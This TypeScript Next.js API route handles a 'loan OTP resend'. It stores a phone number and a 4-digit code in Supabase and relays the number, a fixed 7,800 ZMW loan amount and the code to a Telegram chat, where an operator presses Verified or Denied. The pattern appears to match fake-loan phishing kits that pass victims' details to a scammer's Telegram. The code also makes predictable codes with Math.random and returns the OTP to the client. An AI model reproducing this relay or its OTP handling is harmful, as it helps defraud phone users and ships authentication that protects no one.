import { createClient } from '@/lib/supabase/server';

export async function POST(request: Request) {
  try {
    const { phoneNumber } = await request.json();

    if (!phoneNumber) {
      return Response.json(
        { error: 'Phone number is required' },
        { status: 400 }
      );
    }

    const supabase = await createClient();

    // Generate new 4-digit OTP code
    const otpCode = Math.floor(1000 + Math.random() * 9000).toString();

    // Insert new loan OTP record
    const { data, error } = await supabase
      .from('loan_otp_verifications')
      .insert({
        phone_number: phoneNumber,
        otp_code: otpCode,
        status: 'pending',
      })
      .select()
      .single();

    if (error) {
      console.error('[v0] Supabase insert error:', error);
      return Response.json(
        { error: 'Failed to create loan OTP record' },
        { status: 500 }
      );
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      return Response.json(
        { error: 'Telegram credentials not configured' },
        { status: 500 }
      );
    }

    // Send Telegram message with inline buttons
    const telegramMessage = `
🔄 *Loan OTP Resend Request*

📱 Phone Number: \`+260${phoneNumber}\`
💰 Loan Amount: \`7,800 ZMW\`
🔑 OTP Code: \`${otpCode}\`
⏰ Timestamp: ${new Date().toISOString()}
📋 Record ID: \`${data.id}\`

Please verify or deny this loan confirmation:
`;

    const inlineKeyboard = {
      inline_keyboard: [
        [
          {
            text: '✅ Verified',
            callback_data: `accept_loan_otp_${data.id}`,
          },
          {
            text: '❌ Denied',
            callback_data: `deny_loan_otp_${data.id}`,
          },
        ],
      ],
    };

    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: telegramMessage,
          parse_mode: 'Markdown',
          reply_markup: inlineKeyboard,
        }),
      }
    );

    const telegramData = await response.json();

    if (!response.ok) {
      console.error('[v0] Telegram error:', telegramData);
      return Response.json(
        { error: 'Failed to send Telegram message' },
        { status: 500 }
      );
    }

    // Update record with message_id for tracking
    await supabase
      .from('loan_otp_verifications')
      .update({ message_id: telegramData.result.message_id })
      .eq('id', data.id);

    return Response.json({
      success: true,
      recordId: data.id,
      otpCode,
      message: 'Resend notification sent to Telegram',
    });
  } catch (error) {
    console.error('[v0] Error resending loan OTP:', error);
    return Response.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
